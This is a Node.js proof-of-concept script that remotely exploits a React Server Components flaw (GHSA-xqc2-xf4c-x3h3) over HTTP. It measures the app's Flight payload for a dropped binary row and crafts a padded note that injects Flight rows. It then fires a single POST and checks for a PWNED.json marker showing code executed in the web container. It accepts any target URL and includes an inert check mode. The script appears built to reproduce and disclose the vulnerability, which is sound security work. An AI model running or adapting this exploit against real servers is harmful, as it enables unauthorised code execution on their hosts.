/**
 * The remote exploit. Unlike run.mjs, this never imports React and never
 * touches the target's files: it only speaks HTTP to a URL.
 *
 *   1. MEASURE   fetch the RSC payload the app already serves to browsers and
 *                read the framing off it - which binary row was dropped, how
 *                many bytes it declared, and which chunk id carries the note.
 *   2. CRAFT     build the user-supplied string so the client resyncs exactly on
 *                the injected rows.
 *   3. FIRE      one ordinary request carrying that string.
 *   4. VERIFY    read back the evidence the payload left.
 *
 * Usage:
 *   node poc/remote.mjs                                  # both compose stacks
 *   node poc/remote.mjs --url http://host:3000 --proof ./dir
 *   node poc/remote.mjs --url http://host:3000 --check      # inert: proves
 *                                                           # injection only
 *   node poc/remote.mjs --url http://host:3000 --no-verify   # fires, skips [4]
 */
import {readFile, rm, mkdir} from 'node:fs/promises';
import {fileURLToPath} from 'node:url';
import {dirname, join, resolve} from 'node:path';
import {parseRows, formatRows, preview} from '../src/wire.mjs';
import {buildNote, buildProbeRows, buildExploitCode, GADGETS} from '../src/payload.mjs';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const args = parseArgs(process.argv.slice(2));
const gadget = args.gadget ?? 'vm';

// Where the payload drops its evidence *inside* the container, and where that
// path is visible from here. Compose bind-mounts one onto the other.
const MARKER_IN_CONTAINER = '/proof/PWNED.json';

const targets = args.url
  ? [{name: 'target', url: args.url, proofDir: args.proof ?? null}]
  : [
      {
        name: 'vulnerable (19.2.8)',
        url: 'http://localhost:3000',
        proofDir: join(root, 'artifacts/remote/vulnerable'),
      },
      {
        name: 'patched (19.2.9)',
        url: 'http://localhost:4000',
        proofDir: join(root, 'artifacts/remote/patched'),
      },
    ];

banner('GHSA-xqc2-xf4c-x3h3 - remote exploitation of a containerised RSC app');
console.log(`  gadget   ${GADGETS[gadget].describe}`);
console.log(`  targets  ${targets.map(t => t.url).join('  ')}`);

const results = [];
for (const target of targets) {
  results.push(await attack(target));
}

banner('Verdict');
for (const r of results) {
  // `executed` is true/false, null when verification was skipped, or a string
  // in --check mode, where landing code is deliberately not attempted.
  const executed =
    r.executed === null
      ? 'unverified'
      : typeof r.executed === 'string'
        ? r.executed
        : r.executed
          ? 'YES'
          : 'no';
  console.log(
    `  ${r.name.padEnd(20)} server ${String(r.version).padEnd(8)} ` +
      `desync ${r.desync ? 'YES' : 'no '}   code executed ${executed}`,
  );
}

const expected =
  targets.length === 2 &&
  results[0].executed === true &&
  results[1].executed === false;
if (targets.length === 2) {
  console.log(expected ? '\n  PoC reproduced over HTTP.' : '\n  Unexpected result.');
  process.exit(expected ? 0 : 1);
}
process.exit(results[0].executed ? 0 : 1);

// ---------------------------------------------------------------------- attack

async function attack(target) {
  step(`${target.name} - ${target.url}`);

  const health = await getJSON(`${target.url}/health`);
  console.log(`  tier: ${health.tier}  react-server-dom-webpack ${health.version}  node ${health.node}`);

  // --- 0. baseline ---------------------------------------------------------
  // Thumbnails stay under VIEW_SIZE, so React copies them into its own staging
  // view and the shared backing store is never handed to the destination: the
  // app is healthy. Asking for full-resolution attachments crosses that line.
  const thumbs = await fetch(`${target.url}/?note=hello`);
  const fullRes = await fetch(`${target.url}/?full=1&note=hello`);
  console.log(
    `\n  [0] GET /            -> ${thumbs.status} (thumbnails, 1024 bytes each)\n` +
      `      GET /?full=1     -> ${fullRes.status} (full attachments, 3000 bytes each)`,
  );
  if (!fullRes.ok) {
    console.log(
      '      the full-resolution route is already broken for every visitor, with no\n' +
        '      attacker input at all - the availability half of the same root cause.',
    );
  }

  // --- 1. measure ----------------------------------------------------------
  // A filler note long enough that React outlines it into a raw T row, and long
  // enough that the swallowed region ends inside it, leaving the tail of the
  // payload intact to read.
  const probeBytes = await fetchRSC(target.url, 'N'.repeat(6000));
  const probeRows = parseRows(probeBytes);
  console.log(
    `\n  [1] measured ${probeBytes.length} bytes of RSC payload from ${target.url}/rsc?full=1`,
  );
  console.log(formatRows(probeRows));

  const dropped = probeRows.find(
    r => r.kind === 'length' && r.tag !== 'T' && !isUniform(r.body),
  );
  const noteIdHex = findNoteId(probeRows);

  if (!dropped) {
    console.log(
      '\n  => every binary row carries its own bytes. The wire is sound, so there is\n' +
        '     no resync point to aim at and nothing to inject into.',
    );
    return {name: target.name, version: health.version, desync: false, executed: false};
  }

  console.log(
    `\n  => row ${dropped.idHex} declares ${dropped.declaredLength} bytes that were never written,\n` +
      `     so the client reads the following rows as its body: ` +
      `${JSON.stringify(preview(dropped.body.subarray(0, 44), 44))}\n` +
      `  => the note is carried by chunk id ${noteIdHex}`,
  );

  // --- 2. craft ------------------------------------------------------------
  // In --check mode the injected rows only refill the note's chunk id with a
  // token: enough to prove the attacker's bytes are parsed as Flight rows,
  // without compiling or running anything on the target.
  const token = `GHSA-xqc2-xf4c-x3h3 row injection confirmed ${Date.now()}`;
  const crafted = buildNote({
    droppedRowLength: dropped.declaredLength,
    noteIdHex,
    gadget,
    ...(args.check
      ? {rows: buildProbeRows({noteIdHex, token})}
      : {code: buildExploitCode({markerPath: MARKER_IN_CONTAINER, gadget})}),
  });
  console.log(
    `\n  [2] crafted a ${crafted.noteByteLength}-character note: ` +
      `${crafted.padding} bytes of padding, then ${
        crafted.rows.split('\n').filter(Boolean).length
      } injected Flight ${args.check ? 'row (inert probe)' : 'rows'}`,
  );

  // --- 2b. check mode ------------------------------------------------------
  if (args.check) {
    const probe = await fetch(target.url + '/?full=1', {
      method: 'POST',
      headers: {'content-type': 'text/plain; charset=utf-8'},
      body: crafted.note,
    });
    const html = await probe.text();
    const injected = html.includes(token);
    console.log(
      `\n  [3] POST ${target.url}/?full=1  ->  ${probe.status} ${probe.statusText}\n` +
        `      the token ${injected ? 'came back as the rendered note' : 'did not appear'}: ` +
        `row injection ${injected ? 'CONFIRMED' : 'not confirmed'}`,
    );
    console.log(
      injected
        ? '\n  => this target is exploitable. No code was compiled or run on it.'
        : '\n  => the wire desynchronises but the injected row did not take effect.',
    );
    return {
      name: target.name,
      version: health.version,
      desync: true,
      executed: injected ? 'not attempted' : false,
    };
  }

  if (target.proofDir) {
    await mkdir(target.proofDir, {recursive: true});
    await rm(join(target.proofDir, 'PWNED.json'), {force: true});
  }

  // --- 3. fire -------------------------------------------------------------
  const response = await fetch(target.url + '/?full=1', {
    method: 'POST',
    headers: {'content-type': 'text/plain; charset=utf-8'},
    body: crafted.note,
  });
  const body = await response.text();
  console.log(
    `\n  [3] POST ${target.url}/?full=1  ->  ${response.status} ${response.statusText}, ` +
      `${Buffer.byteLength(body)} bytes of ${response.headers.get('content-type')}`,
  );

  // Confirm the injection took effect on the wire, independent of the payload.
  const firedBytes = await fetchRSC(target.url, crafted.note);
  const firedRows = parseRows(firedBytes);
  const injected = firedRows.filter(r => r.kind === 'line' && /"\$\$typeof"/.test(r.body));
  console.log(
    `      the same request's payload now parses as ${firedRows.length} rows, ` +
      `${injected.length} of them injected by the note`,
  );

  // --- 4. verify -----------------------------------------------------------
  if (args['no-verify'] || !target.proofDir) {
    console.log('\n  [4] verification skipped');
    return {name: target.name, version: health.version, desync: true, executed: null};
  }

  const marker = await readMarker(join(target.proofDir, 'PWNED.json'));
  if (marker) {
    console.log('\n  [4] CODE EXECUTED inside the web container:');
    console.log(
      JSON.stringify(marker, null, 2)
        .split('\n')
        .map(l => '      ' + l)
        .join('\n'),
    );
  } else {
    console.log('\n  [4] no evidence written - the payload did not run');
  }

  return {
    name: target.name,
    version: health.version,
    desync: true,
    executed: Boolean(marker),
  };
}

// --------------------------------------------------------------------- helpers

/** The payload a real RSC app already serves to its own browser clients. */
async function fetchRSC(base, note) {
  const response = await fetch(`${base}/rsc?full=1`, {
    method: 'POST',
    headers: {'content-type': 'text/plain; charset=utf-8'},
    body: note,
  });
  if (!response.ok) {
    throw new Error(`POST ${base}/rsc returned ${response.status}: ${await response.text()}`);
  }
  return Buffer.from(await response.arrayBuffer());
}

async function getJSON(url) {
  const response = await fetch(url);
  if (!response.ok) throw new Error(`${url} returned ${response.status}`);
  return response.json();
}

/**
 * The container writes the file through a bind mount, so it can take a moment to
 * be visible here.
 */
async function readMarker(path, attempts = 20) {
  for (let i = 0; i < attempts; i++) {
    try {
      return JSON.parse(await readFile(path, 'utf8'));
    } catch {
      await new Promise(r => setTimeout(r, 100));
    }
  }
  return null;
}

/**
 * The real root row is plain text at the tail of the payload, so its body
 * survives even though the desync leaves the parser reading its *id* out of the
 * middle of the note. Match on the body, not the id.
 */
function findNoteId(rows) {
  for (let i = rows.length - 1; i >= 0; i--) {
    if (rows[i].kind !== 'line') continue;
    try {
      const model = JSON.parse(rows[i].body.toString('utf8'));
      if (typeof model.userNote === 'string' && model.userNote.startsWith('$')) {
        return model.userNote.slice(1);
      }
    } catch {
      /* not the row we want */
    }
  }
  throw new Error('could not locate the chunk id carrying the user note');
}

function isUniform(buf) {
  if (buf.length === 0) return false;
  for (let i = 1; i < buf.length; i++) if (buf[i] !== buf[0]) return false;
  return true;
}

function banner(text) {
  console.log('\n' + '='.repeat(78) + `\n${text}\n` + '='.repeat(78));
}

function step(text) {
  console.log('\n' + '-'.repeat(78) + `\n${text}\n` + '-'.repeat(78));
}

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    if (!argv[i].startsWith('--')) continue;
    const key = argv[i].slice(2);
    if (argv[i + 1] && !argv[i + 1].startsWith('--')) out[key] = argv[++i];
    else out[key] = true;
  }
  return out;
}
